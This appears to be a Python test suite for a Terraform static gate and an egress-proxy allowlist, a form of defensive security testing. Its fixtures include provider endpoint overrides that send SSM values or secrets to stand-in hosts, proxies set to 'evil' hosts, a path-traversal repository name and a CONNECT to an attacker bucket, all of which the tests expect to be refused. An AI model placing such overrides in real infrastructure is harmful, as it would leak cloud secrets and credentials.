"""Tests for scripts/check_tf_config.py (static pre-plan gate, Guardian M2)."""
import importlib.util
import json
import sys
import os
import tempfile
import textwrap
import unittest
from contextlib import redirect_stderr, redirect_stdout
from io import StringIO
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("check_tf_config", ROOT / "scripts" / "check_tf_config.py")
ctc = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ctc)

GOOD_ROOT = '''
# endpoints { } in a comment is fine
terraform {
  required_version = ">= 1.10"
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 6.0" }
  }
  backend "s3" {
    bucket       = "shc-tfstate"
    key          = "prod/terraform.tfstate"
    region       = "eu-west-2"
    profile      = "shc"
    encrypt      = true
    use_lockfile = true
  }
}

provider "aws" {
  region              = var.region
  profile             = var.aws_profile
  allowed_account_ids = [var.account_id]
  default_tags {
    tags = { Project = "x", Note = "braces { } and \\"quotes\\" in ${var.a}" }
  }
}

provider "aws" {
  alias   = "us_east_1"
  region  = "us-east-1"
  profile = "shc"
}

locals {
  doc = <<-EOT
    provider "aws" { endpoints { s3 = "http://evil" } }
  EOT
  m = { for k, v in var.x : k => v if v != "" }
  esc = "$${not_interpolated}"
}

module "site" {
  source = "./modules/site"
  name   = "a"
}
'''

GOOD_MODULE = '''
resource "aws_s3_bucket" "b" {
  bucket = "x"
}
'''


class TfConfigTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = self.tmp.name
        self.write("infra/main.tf", GOOD_ROOT)
        self.write("infra/modules/site/main.tf", GOOD_MODULE)

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, rel, text):
        p = os.path.join(self.root, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w") as f:
            f.write(textwrap.dedent(text))

    def check(self, profile="shc"):
        return ctc.check(self.root, "infra", profile)

    def add(self, text, rel="infra/extra.tf"):
        self.write(rel, text)
        return self.check()

    def test_good_config(self):
        self.assertEqual(self.check(), [])

    def test_provider_overrides_refused(self):
        cases = {
            "endpoints": 'endpoints {\n s3 = "https://x.example/${data.aws_ssm_parameter.p.value}"\n}',
            "custom_ca_bundle": 'custom_ca_bundle = "/tmp/ca.pem"',
            "http_proxy": 'http_proxy = "http://evil:3128"',
            "https_proxy": 'https_proxy = "http://evil:3128"',
            "no_proxy": 'no_proxy = "*"',
            "sts_region": 'sts_region = "us-east-1"',
            "skip_credentials_validation": "skip_credentials_validation = true",
            "skip_requesting_account_id": "skip_requesting_account_id = true",
            "insecure": "insecure = true",
            "assume_role": 'assume_role {\n role_arn = "arn:aws:iam::1:role/x"\n}',
            "assume_role_with_web_identity": 'assume_role_with_web_identity {\n role_arn = "x"\n}',
            "shared_config_files": 'shared_config_files = ["/tmp/evil"]',
            "shared_credentials_files": 'shared_credentials_files = ["/tmp/evil"]',
            "access_key": 'access_key = "AKIA..."',
            "ec2_metadata_service_endpoint": 'ec2_metadata_service_endpoint = "http://x"',
        }
        for name, body in cases.items():
            problems = self.add(f'provider "aws" {{\n alias = "x"\n region = "eu-west-2"\n {body}\n}}\n')
            self.assertTrue(any(name in p for p in problems), (name, problems))

    def test_default_tags_only_tags(self):
        problems = self.add('provider "aws" {\n alias = "y"\n default_tags {\n endpoint = "x"\n }\n}\n')
        self.assertTrue(problems)

    def test_profile_rules(self):
        self.assertTrue(self.add('provider "aws" {\n alias = "p"\n profile = "other"\n}\n'))
        self.assertTrue(self.add('provider "aws" {\n alias = "p"\n profile = "shc-${var.x}"\n}\n'))
        self.assertTrue(self.add('provider "aws" {\n alias = "p"\n profile = lookup(var.m, "a")\n}\n'))
        self.assertEqual(self.add('provider "aws" {\n alias = "p"\n profile = "shc"\n}\n'), [])
        self.assertEqual(self.add('provider "aws" {\n alias = "p"\n profile = var.p\n}\n'), [])

    def test_other_providers(self):
        self.assertTrue(self.add('provider "external" {}\n'))
        self.assertTrue(self.add('provider "http" {}\n'))
        self.assertTrue(self.add('provider "random" {\n some = "x"\n}\n'))
        self.assertEqual(self.add('provider "random" {\n alias = "r"\n}\n'), [])

    def test_backend_rules(self):
        self.assertTrue(self.add('terraform {\n backend "s3" {\n endpoints = { s3 = "http://x" }\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n backend "s3" {\n https_proxy = "http://x"\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n backend "s3" {\n profile = "other"\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n backend "http" {\n address = "https://x"\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n cloud {\n organization = "x"\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n provider_meta "aws" {}\n}\n'))

    def test_terraform_remote_state_refused(self):
        # Guardian HIGH repro: an s3 config endpoint override in a remote-state data source passed.
        body = """
        data "terraform_remote_state" "x" {
          backend = "s3"
          config = {
            bucket    = "b"
            key       = "k"
            region    = "eu-west-2"
            endpoints = { s3 = "https://x.example/${var.secret}" }
          }
        }
        """
        problems = self.add(body)
        self.assertTrue(any("terraform_remote_state" in p for p in problems), problems)
        with redirect_stdout(StringIO()), redirect_stderr(StringIO()):
            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 1)
        # even without overrides, and in a nested module, and in JSON syntax
        os.remove(os.path.join(self.root, "infra/extra.tf"))
        self.write("infra/modules/site/rs.tf", 'data "terraform_remote_state" "y" {\n backend = "local"\n}\n')
        self.assertTrue(any("terraform_remote_state" in p for p in self.check()))
        os.remove(os.path.join(self.root, "infra/modules/site/rs.tf"))
        self.write("infra/rs.tf.json", json.dumps({"data": {"terraform_remote_state": {"z": {"backend": "s3"}}}}))
        self.assertTrue(any("terraform_remote_state" in p for p in self.check()))

    def test_data_source_allowlist(self):
        for t in ("aws_kms_ciphertext", "aws_kms_secrets", "aws_lambda_invocation",
                  "aws_secretsmanager_secret_version", "aws_ssm_parameter", "aws_s3_object", "aws_lambda_function",
                  "aws_ecr_authorization_token", "http", "external"):
            problems = self.add(f'data "{t}" "x" {{}}\n')
            self.assertTrue(any(t in p and "allowlist" in p for p in problems), (t, problems))
        for t in ("aws_caller_identity", "aws_iam_policy_document", "aws_route53_zone", "archive_file"):
            self.assertEqual(self.add(f'data "{t}" "x" {{}}\n'), [], t)

    def test_data_in_check_block_and_nested_module(self):
        problems = self.add('check "c" {\n data "aws_lambda_invocation" "x" {\n function_name = "f"\n input = "{}"\n }\n'
                            ' assert {\n condition = true\n error_message = "x"\n }\n}\n')
        self.assertTrue(any("aws_lambda_invocation" in p for p in problems), problems)
        self.write("infra/modules/site/k.tf", 'data "aws_kms_secrets" "s" {}\n')
        self.assertTrue(any("aws_kms_secrets" in p for p in self.check()))

    def test_ephemeral_and_action_blocks(self):
        self.assertEqual(self.add('ephemeral "random_password" "p" {\n length = 32\n}\n'), [])
        for body in ('ephemeral "aws_secretsmanager_secret_version" "s" {\n secret_id = "x"\n}\n',
                     'ephemeral "aws_lambda_invocation" "i" {\n function_name = "f"\n payload = "{}"\n}\n',
                     'action "aws_lambda_invoke" "a" {\n config {\n function_name = "f"\n }\n}\n'):
            self.assertTrue(self.add(body), body)

    def test_json_data_ephemeral_check_action(self):
        for doc in ({"data": {"aws_kms_ciphertext": {"x": {"plaintext": "s"}}}},
                    {"ephemeral": {"aws_kms_secrets": {"x": {}}}},
                    {"check": {"c": {"data": {"aws_lambda_invocation": {"x": {}}}}}},
                    {"action": {"aws_lambda_invoke": {"a": {}}}}):
            self.write("infra/j.tf.json", json.dumps(doc))
            self.assertTrue(self.check(), doc)
        self.write("infra/j.tf.json", json.dumps({"data": {"aws_partition": {"p": {}}}}))
        self.assertEqual(self.check(), [])

    def test_builtin_types(self):
        self.assertEqual(self.add('resource "terraform_data" "t" {\n input = "x"\n}\n'), [])
        self.assertTrue(self.add('data "terraform_something" "t" {}\n'))
        self.assertEqual(self.add('data "aws_caller_identity" "c" {}\n'), [])

    def test_nested_local_module_checked(self):
        self.write("infra/modules/site/p.tf", 'provider "aws" {\n endpoints {\n sts = "https://x"\n }\n}\n')
        problems = self.check()
        self.assertTrue(any("modules/site/p.tf" in p and "endpoints" in p for p in problems), problems)

    def test_remote_or_escaping_modules(self):
        self.assertTrue(self.add('module "m" {\n source = "git::https://example.com/m.git"\n}\n'))
        self.assertTrue(self.add('module "m" {\n source = "hashicorp/consul/aws"\n}\n'))
        self.assertTrue(self.add('module "m" {\n source = "${path.module}/x"\n}\n'))
        outside = os.path.join(os.path.dirname(self.root), "outside-" + os.path.basename(self.root))
        os.makedirs(outside, exist_ok=True)
        self.addCleanup(os.rmdir, outside)
        problems = self.add(f'module "m" {{\n source = "../../outside-{os.path.basename(self.root)}"\n}}\n')
        self.assertTrue(any("outside the repository" in p for p in problems), problems)

    def test_json_syntax(self):
        self.write("infra/x.tf.json", json.dumps({"provider": {"aws": [{"alias": "j", "endpoints": {"s3": "http://x"}}]}}))
        self.assertTrue(any("endpoints" in p for p in self.check()))
        self.write("infra/x.tf.json", json.dumps({"terraform": {"backend": {"s3": {"insecure": True}}}}))
        self.assertTrue(any("insecure" in p for p in self.check()))
        self.write("infra/x.tf.json", json.dumps({"module": {"m": {"source": "git::https://x"}}}))
        self.assertTrue(self.check())
        self.write("infra/x.tf.json", json.dumps({"provider": {"aws": {"alias": "ok", "profile": "shc"}}}))
        self.assertEqual(self.check(), [])

    def test_unparseable_fails_closed(self):
        self.write("infra/bad.tf", 'provider "aws" {\n region = "x"\n')
        with redirect_stderr(StringIO()), redirect_stdout(StringIO()):
            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 2)
        self.write("infra/bad.tf", 'locals {\n a = "unterminated\n}\n')
        with redirect_stderr(StringIO()), redirect_stdout(StringIO()):
            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 2)

    def test_cli(self):
        with redirect_stdout(StringIO()), redirect_stderr(StringIO()):
            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 0)
        self.add('provider "aws" {\n custom_ca_bundle = "x"\n}\n')
        with redirect_stdout(StringIO()), redirect_stderr(StringIO()) as err:
            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 1)
        self.assertIn("custom_ca_bundle", err.getvalue())


class EgressProxyRulesTest(unittest.TestCase):
    def setUp(self):
        spec2 = importlib.util.spec_from_file_location("egress_proxy", ROOT / "scripts" / "egress_proxy.py")
        self.ep = importlib.util.module_from_spec(spec2)
        spec2.loader.exec_module(self.ep)
        spec3 = importlib.util.spec_from_file_location("egress_hosts", ROOT / "scripts" / "egress_hosts.py")
        self.eh = importlib.util.module_from_spec(spec3)
        spec3.loader.exec_module(self.eh)

    def shc_hosts(self, **kw):
        args = dict(region="eu-west-2", state_bucket="shc-tfstate-393686273578-euw2",
                    services=["lambda", "dynamodb", "logs", "ssm", "sns", "events", "monitoring", "apigateway", "email"],
                    global_hosts=["iam.amazonaws.com", "cloudfront.amazonaws.com", "route53.amazonaws.com",
                                  "acm.us-east-1.amazonaws.com"],
                    buckets=["shc-site-393686273578-euw2", "shc-backups-393686273578-euw2"])
        args.update(kw)
        return self.eh.build(**args)

    def test_exact_hosts_only(self):
        allowed = set(self.shc_hosts()) | self.ep.FIXED_HOSTS
        ok = ("sts.eu-west-2.amazonaws.com", "lambda.eu-west-2.amazonaws.com", "iam.amazonaws.com",
              "acm.us-east-1.amazonaws.com", "shc-tfstate-393686273578-euw2.s3.eu-west-2.amazonaws.com",
              "shc-site-393686273578-euw2.s3.amazonaws.com", "registry.terraform.io", "LAMBDA.EU-WEST-2.AMAZONAWS.COM.")
        for h in ok:
            self.assertTrue(self.ep.host_allowed(h, allowed), h)
        bad = ("attacker-bucket.s3.eu-west-2.amazonaws.com", "s3.eu-west-2.amazonaws.com", "s3.amazonaws.com",
               "abc123.execute-api.eu-west-2.amazonaws.com", "x.elb.amazonaws.com",
               "my-lb-1.eu-west-2.elb.amazonaws.com", "lambda.us-east-1.amazonaws.com", "sts.amazonaws.com.evil",
               "example.com", "169.254.169.254", "evil.lambda.eu-west-2.amazonaws.com")
        for h in bad:
            self.assertFalse(self.ep.host_allowed(h, allowed), h)

    def test_dynamodb_account_endpoint(self):
        hosts = self.shc_hosts(account_id="393686273578")
        self.assertIn("393686273578.ddb.eu-west-2.amazonaws.com", hosts)
        self.assertNotIn("393686273578.ddb.eu-west-2.amazonaws.com", self.shc_hosts(
            account_id="393686273578", services=["lambda"]))
        with self.assertRaises(self.eh.HostError):
            self.shc_hosts(account_id="evil.example")
        # only the project's own account, never another one
        allowed = set(hosts) | self.ep.FIXED_HOSTS
        self.assertFalse(self.ep.host_allowed("111111111111.ddb.eu-west-2.amazonaws.com", allowed))

    def test_s3_control_account_endpoint(self):
        hosts = self.shc_hosts(account_id="393686273578")
        self.assertIn("393686273578.s3-control.eu-west-2.amazonaws.com", hosts)
        self.assertNotIn("393686273578.s3-control.eu-west-2.amazonaws.com",
                         self.shc_hosts(account_id="393686273578", buckets=[]))
        allowed = set(hosts) | self.ep.FIXED_HOSTS
        self.assertFalse(self.ep.host_allowed("111111111111.s3-control.eu-west-2.amazonaws.com", allowed))

    def test_path_style_is_opt_in(self):
        self.assertNotIn("s3.eu-west-2.amazonaws.com", self.shc_hosts())
        self.assertIn("s3.eu-west-2.amazonaws.com", self.shc_hosts(s3_path_style=True))

    def test_build_fails_closed(self):
        for kw in ({"services": []}, {"services": ["s3"]}, {"services": ["execute-api"]}, {"services": ["elb"]},
                   {"services": ["s3-control"]}, {"services": ["la mbda"]},
                   {"global_hosts": ["x.s3.amazonaws.com"]}, {"global_hosts": ["s3.amazonaws.com"]},
                   {"global_hosts": ["abc.execute-api.us-east-1.amazonaws.com"]},
                   {"global_hosts": ["example.com"]}, {"global_hosts": ["a.b.c.amazonaws.com"]},
                   {"buckets": ["dotted.bucket"]}, {"buckets": ["UPPER"]}, {"state_bucket": ""},
                   {"region": "eu-west"}, {"state_region": "nowhere"}):
            with self.assertRaises(self.eh.HostError, msg=kw):
                self.shc_hosts(**kw)

    POLICY_DIR = str(ROOT / "policy" / "egress")

    def policy_main(self, repo, region="eu-west-2", account="393686273578", bucket="", out=None, gh=None):
        args = ["--policy-dir", self.POLICY_DIR, "--repository", repo, "--expect-region", region,
                "--expect-account", account, "--expect-state-bucket", bucket, "--out", out or os.devnull]
        if gh:
            args += ["--github-output", gh]
        with redirect_stdout(StringIO()), redirect_stderr(StringIO()) as err:
            code = self.eh.main(args)
        return code, err.getvalue()

    def test_every_policy_file_is_valid(self):
        files = sorted(Path(self.POLICY_DIR).glob("*/*.json"))
        self.assertGreaterEqual(len(files), 2)
        for f in files:
            repo = f"{f.parent.name}/{f.stem}"
            pol = self.eh.load_policy(self.POLICY_DIR, repo)
            hosts = self.eh.build(pol["region"], pol["state_bucket"], pol["services"], pol["global_hosts"],
                                  pol["buckets"], pol["state_region"], pol["s3_path_style"])
            self.assertFalse(pol["s3_path_style"], repo)
            self.assertFalse(any(h.startswith("s3.") for h in hosts), repo)

    def test_policy_selected_by_repository_and_outputs_trusted_state(self):
        with tempfile.TemporaryDirectory() as d:
            out, gh = os.path.join(d, "hosts"), os.path.join(d, "gh")
            code, _ = self.policy_main("tobipjuk/incaseofemergency", account="147161676861", out=out, gh=gh)
            self.assertEqual(code, 0)
            hosts = self.ep.load_hosts(out)
            self.assertIn("in-case-of-emergency-tfstate-20260924210003923500000001.s3.eu-west-2.amazonaws.com", hosts)
            self.assertIn("ice-uploads-20260924223216864500000001.s3.eu-west-2.amazonaws.com", hosts)
            self.assertNotIn("shc-site-393686273578-euw2.s3.eu-west-2.amazonaws.com", hosts)
            outputs = dict(line.split("=", 1) for line in Path(gh).read_text().splitlines())
            self.assertEqual(outputs["state_bucket"], "in-case-of-emergency-tfstate-20260924210003923500000001")
            self.assertEqual(outputs["state_region"], "eu-west-2")

    def test_repo_without_policy_refused(self):
        with tempfile.TemporaryDirectory() as d:
            out = os.path.join(d, "hosts")
            code, err = self.policy_main("tobipjuk/no-policy-repo", out=out)
            self.assertEqual(code, 1)
            self.assertIn("no egress policy", err)
            self.assertFalse(os.path.exists(out))
        for bad in ("tobipjuk/../etc/passwd", "../x/y", "tobipjuk", "a/b/c"):
            self.assertEqual(self.policy_main(bad)[0], 1, bad)

    def test_inputs_can_only_agree(self):
        self.assertEqual(self.policy_main("tobipjuk/starhuntercrew")[0], 0)
        self.assertEqual(self.policy_main("tobipjuk/starhuntercrew", bucket="shc-tfstate-393686273578-euw2")[0], 0)
        self.assertEqual(self.policy_main("tobipjuk/starhuntercrew", bucket="attacker-state")[0], 1)
        self.assertEqual(self.policy_main("tobipjuk/starhuntercrew", region="us-east-1")[0], 1)
        self.assertEqual(self.policy_main("tobipjuk/starhuntercrew", account="111111111111")[0], 1)

    def test_policy_file_shape_enforced(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, "o"))
            good = json.loads(Path(self.POLICY_DIR, "tobipjuk", "starhuntercrew.json").read_text())
            for mutate in (lambda p: p.update(repository="o/other"), lambda p: p.update(extra=1),
                           lambda p: p.update(s3_path_style="yes"), lambda p: p.update(buckets="b"),
                           lambda p: p.update(schema=2), lambda p: p.update(account_id="x")):
                pol = dict(good, repository="o/r")
                mutate(pol)
                Path(d, "o", "r.json").write_text(json.dumps(pol))
                with self.assertRaises(self.eh.HostError):
                    self.eh.load_policy(d, "o/r")

    def test_hosts_file_parsing(self):
        with tempfile.TemporaryDirectory() as d:
            out = os.path.join(d, "hosts.txt")
            Path(out).write_text("")
            with self.assertRaises(ValueError):
                self.ep.load_hosts(out)
            Path(out).write_text("*.amazonaws.com\n")
            with self.assertRaises(ValueError):
                self.ep.load_hosts(out)

    def test_proxy_refuses_busy_port_and_writes_ready_file(self):
        import socket
        import subprocess
        import time
        with tempfile.TemporaryDirectory() as d:
            hosts = os.path.join(d, "h")
            Path(hosts).write_text("sts.eu-west-2.amazonaws.com\n")
            busy = socket.socket()
            busy.bind(("127.0.0.1", 0))
            busy.listen(1)
            port = busy.getsockname()[1]
            ready = os.path.join(d, "ready")
            r = subprocess.run([sys.executable, "-I", str(ROOT / "scripts" / "egress_proxy.py"), "--port", str(port),
                                "--hosts-file", hosts, "--ready-file", ready], capture_output=True, timeout=20)
            busy.close()
            self.assertEqual(r.returncode, 1)
            self.assertIn(b"cannot bind", r.stderr)
            self.assertFalse(os.path.exists(ready))
            # free port: ready file holds the proxy's pid; refuses a foreign CONNECT
            s2 = socket.socket()
            s2.bind(("127.0.0.1", 0))
            port = s2.getsockname()[1]
            s2.close()
            proc = subprocess.Popen([sys.executable, "-I", str(ROOT / "scripts" / "egress_proxy.py"), "--port", str(port),
                                     "--hosts-file", hosts, "--ready-file", ready, "--stats", os.path.join(d, "st")],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                for _ in range(100):
                    if os.path.exists(ready) and Path(ready).read_text().strip():
                        break
                    time.sleep(0.05)
                self.assertEqual(Path(ready).read_text().strip(), str(proc.pid))
                c = socket.create_connection(("127.0.0.1", port), timeout=5)
                c.sendall(b"CONNECT evil.s3.eu-west-2.amazonaws.com:443 HTTP/1.1\r\n\r\n")
                self.assertIn(b"403", c.recv(100))
                c.close()
                time.sleep(0.2)
                self.assertEqual(json.loads(Path(d, "st").read_text())["refused"], 1)
            finally:
                proc.terminate()
                proc.wait(timeout=5)

    def test_connect_parsing_and_addresses(self):
        self.assertEqual(self.ep.parse_connect(b"CONNECT sts.amazonaws.com:443 HTTP/1.1\r\n\r\n"),
                         ("sts.amazonaws.com", 443))
        self.assertIsNone(self.ep.parse_connect(b"GET http://x/ HTTP/1.1\r\n\r\n"))
        self.assertIsNone(self.ep.parse_connect(b"CONNECT a b:443 HTTP/1.1\r\n\r\n"))
        self.assertFalse(self.ep.global_address("169.254.169.254"))
        self.assertFalse(self.ep.global_address("10.1.2.3"))
        self.assertFalse(self.ep.global_address("127.0.0.1"))
        self.assertFalse(self.ep.global_address("::ffff:127.0.0.1"))
        self.assertTrue(self.ep.global_address("52.94.0.1"))


if __name__ == "__main__":
    unittest.main()
